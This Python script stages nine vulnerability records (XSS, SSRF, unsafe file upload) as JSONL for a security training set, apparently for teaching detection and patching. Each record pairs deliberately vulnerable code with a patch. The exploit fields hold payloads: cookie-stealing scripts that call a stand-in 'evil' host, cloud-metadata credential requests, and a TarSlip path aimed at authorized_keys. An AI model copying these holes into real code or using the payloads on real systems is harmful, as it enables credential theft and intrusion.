"""Curation Sprint 001 — batch 2: XSS, SSRF, unsafe file upload."""
from __future__ import annotations

import json

from training.sprint_data.sprint001_batch1 import (
    CWE_PATH, CWE_SSRF, CWE_UPLOAD, CWE_XSS, OUT_DIR, case,
)

CASES = [
    # ----------------------- XSS -----------------------
    case(source_type="semgrep", source_ref="react dangerouslySetInnerHTML / CWE-79",
         lang="javascript", framework="react", filename="Post.jsx",
         code="export function Post({ html }) {\n  return <article dangerouslySetInnerHTML={{ __html: html }} />;\n}\n",
         category="XSS",
         description="User-authored HTML rendered via dangerouslySetInnerHTML without sanitization.",
         exploit="A post body with <img src=x onerror=...> runs script in every reader's session.",
         patch="-  return <article dangerouslySetInnerHTML={{ __html: html }} />;\n+  import DOMPurify from 'dompurify';\n+  return <article dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;",
         references={"cwe": CWE_XSS, "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="Sanitize with DOMPurify; CWE-79 stored XSS."),
    case(source_type="owasp", source_ref="reflected XSS in template / CWE-79",
         lang="python", framework="flask", filename="greet.py",
         code="@app.route('/greet')\ndef greet():\n    return '<h1>Hi ' + request.args.get('name','') + '</h1>'\n",
         category="XSS",
         description="Query parameter reflected into HTML without escaping.",
         exploit="?name=<script>document.location='//evil/'+document.cookie</script> steals cookies.",
         patch="-    return '<h1>Hi ' + request.args.get('name','') + '</h1>'\n+    from markupsafe import escape\n+    return '<h1>Hi ' + str(escape(request.args.get('name',''))) + '</h1>'",
         references={"cwe": CWE_XSS, "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="markupsafe.escape; reflected XSS CWE-79."),
    case(source_type="semgrep", source_ref="DOM innerHTML sink / CWE-79",
         lang="javascript", framework="vanilla", filename="render.js",
         code="const q = new URLSearchParams(location.search).get('q');\ndocument.getElementById('out').innerHTML = 'Results for ' + q;\n",
         category="XSS",
         description="URL parameter assigned into innerHTML (DOM-based XSS).",
         exploit="?q=<img src=x onerror=fetch('//evil/'+document.cookie)> executes in the victim browser.",
         patch="-document.getElementById('out').innerHTML = 'Results for ' + q;\n+document.getElementById('out').textContent = 'Results for ' + q;",
         references={"cwe": CWE_XSS, "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="textContent sink; DOM XSS CWE-79."),

    # ----------------------- SSRF -----------------------
    case(source_type="semgrep", source_ref="python requests SSRF / CWE-918",
         lang="python", framework="flask", filename="preview.py",
         code="@app.post('/preview')\ndef preview():\n    return requests.get(request.json['url'], timeout=5).text\n",
         category="SSRF",
         description="Server fetches an arbitrary user-supplied URL.",
         exploit="url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ leaks cloud creds.",
         patch="+from urllib.parse import urlparse\n     url = request.json['url']\n+    if urlparse(url).scheme not in ('http','https') or not is_public_host(url):\n+        abort(400)\n     return requests.get(url, timeout=5).text",
         severity="HIGH",
         references={"cwe": CWE_SSRF, "owasp": "A10:2021-Server-Side Request Forgery", "cve": None},
         reviewer_notes="Allowlist + block link-local; CWE-918 / OWASP A10."),
    case(source_type="owasp", source_ref="Node fetch open proxy / CWE-918",
         lang="javascript", framework="express", filename="fetch.js",
         code="app.get('/fetch', async (req, res) => {\n  const r = await fetch(req.query.target);\n  res.send(await r.text());\n});\n",
         category="SSRF",
         description="Open server-side fetch of any client-specified target.",
         exploit="target=http://localhost:8500/v1/kv/ reaches internal Consul/admin services.",
         patch="+const { isPublicHttpUrl } = require('./net');\n-  const r = await fetch(req.query.target);\n+  if (!(await isPublicHttpUrl(req.query.target))) return res.status(400).end();\n+  const r = await fetch(req.query.target);",
         severity="HIGH",
         references={"cwe": CWE_SSRF, "owasp": "A10:2021-Server-Side Request Forgery", "cve": None},
         reviewer_notes="Public-host guard; CWE-918."),
    case(source_type="vibecoded", source_ref="nullsec-scanner: AI-generated image fetcher",
         lang="python", framework="fastapi", filename="avatar.py",
         code="@app.get('/avatar')\ndef avatar(src: str):\n    data = requests.get(src).content\n    return Response(data, media_type='image/png')\n",
         category="SSRF",
         description="AI-generated avatar proxy fetches an unvalidated URL and returns the bytes.",
         exploit="src=http://metadata.google.internal/computeMetadata/v1/ exfiltrates GCP metadata.",
         patch="+    if not is_public_host(src):\n+        raise HTTPException(400, 'invalid src')\n     data = requests.get(src).content\n     return Response(data, media_type='image/png')",
         severity="HIGH",
         references={"cwe": CWE_SSRF, "owasp": "A10:2021-Server-Side Request Forgery", "cve": None},
         reviewer_notes="Real vibecoded SSRF; CWE-918."),

    # ----------------------- UNSAFE_FILE_UPLOAD -----------------------
    case(source_type="owasp", source_ref="unrestricted upload / CWE-434",
         lang="python", framework="flask", filename="upload.py",
         code="@app.post('/u')\ndef u():\n    f = request.files['f']\n    f.save('/var/www/html/' + f.filename)\n",
         category="UNSAFE_FILE_UPLOAD",
         description="Arbitrary file saved with client filename into a web-served directory.",
         exploit="Uploading shell.php yields web-root code execution; ../ enables traversal.",
         patch="-    f.save('/var/www/html/' + f.filename)\n+    if f.mimetype not in ALLOWED: abort(415)\n+    name = secrets.token_hex(16) + EXT[f.mimetype]\n+    f.save(os.path.join(PRIVATE_DIR, name))",
         references={"cwe": CWE_UPLOAD, "owasp": "A04:2021-Insecure Design", "cve": None},
         reviewer_notes="Type allowlist + random name + private dir; CWE-434."),
    case(source_type="semgrep", source_ref="path traversal in extract / CWE-22",
         lang="python", framework="none", filename="unpack.py",
         code="def unpack(tar_path, dest):\n    tarfile.open(tar_path).extractall(dest)\n",
         category="UNSAFE_FILE_UPLOAD",
         description="tar extractall trusts member paths (TarSlip path traversal).",
         exploit="A member named ../../home/user/.ssh/authorized_keys writes outside dest.",
         patch="-    tarfile.open(tar_path).extractall(dest)\n+    t = tarfile.open(tar_path)\n+    for m in t.getmembers():\n+        p = os.path.realpath(os.path.join(dest, m.name))\n+        if not p.startswith(os.path.realpath(dest) + os.sep): raise ValueError('tar slip')\n+    t.extractall(dest)",
         severity="HIGH",
         references={"cwe": CWE_PATH, "owasp": "A01:2021-Broken Access Control", "cve": None},
         reviewer_notes="TarSlip guard; CWE-22 path traversal."),
    case(source_type="vibecoded", source_ref="nullsec-scanner: AI-generated SVG avatar upload",
         lang="javascript", framework="express", filename="up.js",
         code="app.post('/up', upload.single('img'), (req,res) => {\n  fs.writeFileSync('public/'+req.file.originalname, req.file.buffer);\n  res.json({ok:true});\n});\n",
         category="UNSAFE_FILE_UPLOAD",
         description="Accepts any type/name; SVG with embedded script becomes stored XSS, served from public/.",
         exploit="A crafted .svg with <script> runs when another user opens the uploaded avatar URL.",
         patch="-  fs.writeFileSync('public/'+req.file.originalname, req.file.buffer);\n+  if (!['image/png','image/jpeg'].includes(req.file.mimetype)) return res.status(415).end();\n+  const out = await sharp(req.file.buffer).png().toBuffer();\n+  fs.writeFileSync('private_uploads/'+crypto.randomUUID()+'.png', out);",
         severity="HIGH",
         references={"cwe": CWE_UPLOAD, "owasp": "A04:2021-Insecure Design", "cve": None},
         reviewer_notes="Re-encode + type check + random name; CWE-434, SVG stored-XSS vector."),
]


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    out = OUT_DIR / "sprint001_batch2.jsonl"
    with out.open("w", encoding="utf-8") as fh:
        for c in CASES:
            fh.write(json.dumps(c) + "\n")
    print(f"staged {len(CASES)} records -> {out}")


if __name__ == "__main__":
    main()
